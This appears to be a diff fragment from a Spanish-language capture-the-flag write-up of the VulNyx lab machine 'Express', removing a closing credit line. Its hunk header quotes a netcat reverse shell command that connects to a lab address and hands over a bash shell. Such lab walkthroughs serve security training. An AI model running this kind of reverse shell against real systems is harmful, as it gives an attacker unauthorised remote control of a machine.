@@ -271,5 +271,3 @@ busybox nc 192.168.93.128 4444 -e bash
 ¡La recibimos!
 
 ---
-
-_Write-up de la máquina **Express** — VulNyx · Recomendada para preparación del CBBH._
